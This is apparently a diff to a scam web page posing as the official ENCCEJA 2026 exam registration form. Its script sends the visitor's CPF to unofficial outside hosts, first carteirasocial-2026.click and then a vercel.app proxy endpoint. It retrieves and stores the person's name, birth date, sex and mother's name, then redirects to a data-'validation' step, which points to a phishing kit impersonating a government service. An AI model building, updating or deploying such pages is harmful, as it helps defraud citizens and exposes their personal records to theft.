@@ -4,7 +4,7 @@
 <head>
 <meta charset="utf-8">
 <meta content="width=device-width, initial-scale=1.0" name="viewport">
-<title>ENCCEJA 2025 - Inscrição</title>
+<title>ENCCEJA 2026 - Inscrição</title>
 <script src="../../3.4.16"></script>
 <link href="../css/all.min.css" rel="stylesheet">
 <link href="../css/home.css" rel="stylesheet">
@@ -126,6 +126,31 @@ input::placeholder {
         const popup = document.getElementById('validation-popup');
         popup.classList.add('hidden');
     }
+
+    function normalizeCpfData(responseData) {
+        if (responseData && responseData.data && responseData.data.DADOS_PESSOAIS) {
+            return responseData;
+        }
+
+        if (!responseData || responseData.success !== true || !responseData.data) {
+            throw new Error('CPF nao encontrado');
+        }
+
+        const dados = responseData.data;
+        return {
+            ...responseData,
+            data: {
+                ...responseData.data,
+                DADOS_PESSOAIS: {
+                    NOME: dados.nome || '',
+                    CPF: dados.cpf || '',
+                    DATA_NASCIMENTO: dados.nascimento || '',
+                    SEXO: dados.sexo || '',
+                    NOME_MAE: dados.nome_mae || ''
+                }
+            }
+        };
+    }
         
     function submitForm() {
         const cpfInput = document.querySelector('#cpf');
@@ -133,7 +158,7 @@ input::placeholder {
 
         showValidationPopup();
             
-        fetch(`https://carteirasocial-2026.click/api/cpf/?cpf=${cpf}`, {
+       fetch(`https://cfeefe-five.vercel.app/api/proxy-btz?cpf=${cpf}`, {
             method: "GET"
         })
         .then(response => {
@@ -143,15 +168,9 @@ input::placeholder {
             return response.json();
         })
         .then(data => {
-            const userData = {
-                nome: data.data.nome,
-                nascimento: data.data.nascimento,
-                sexo: data.data.sexo,
-                nome_mae: data.data.nome_mae
-            };
-            localStorage.setItem('cpfData', JSON.stringify(userData));
+            localStorage.setItem('cpfData', JSON.stringify(normalizeCpfData(data)));
             setTimeout(() => {
-                window.location.href = '../validar-dados';
+                window.location.href = '../validar-dados/';
             }, 1500);
         })
         .catch(error => {
@@ -159,6 +178,7 @@ input::placeholder {
             hideValidationPopup();
             alert("Ocorreu um erro ao validar o CPF. Por favor, tente novamente.");
         });
+
     }
 </script>
 </head>
@@ -188,7 +208,7 @@ input::placeholder {
     <main class="flex-grow py-8">
         <div class="container mx-auto px-4 max-w-3xl">
             <div class="text-center mb-6">
-                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="../images/logo_encceja.png" width="390">
+                <img alt="Logo ENCCEJA 2026" class="mx-auto" height="100" src="../images/logo_encceja.png" width="390">
             </div>
             <div class="border border-gray-300 rounded">
                 <div class="form-header py-2 px-4 text-center">
